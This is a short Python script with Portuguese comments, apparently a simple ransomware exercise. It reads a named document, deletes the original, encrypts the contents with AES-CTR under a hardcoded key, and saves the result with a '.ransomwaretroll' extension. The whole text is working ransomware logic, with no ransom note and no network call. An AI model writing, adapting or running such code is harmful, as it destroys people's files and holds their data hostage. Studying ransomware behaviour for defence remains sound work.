import os
import pyaes

## abrir o arquivo a ser criptografado
nome_arquivo = "Doc_importante.txt"
arquivo = open(nome_arquivo, "rb")
data_arquivo = arquivo.read()
arquivo.close()

## remover o arquivo
os.remove(nome_arquivo)

## chave de criptografia com 16 caracteries
chave = b"descriptografara"
aes = pyaes.AESModeOfOperationCTR(chave)

## criptografar o arquivo
crypto_data = aes.encrypt(data_arquivo)

## salvar o arquivo criptografado
novo_arquivo = nome_arquivo + ".ransomwaretroll"
novo_arquivo = open(f'{novo_arquivo}','wb')
novo_arquivo.write(crypto_data)
novo_arquivo.close()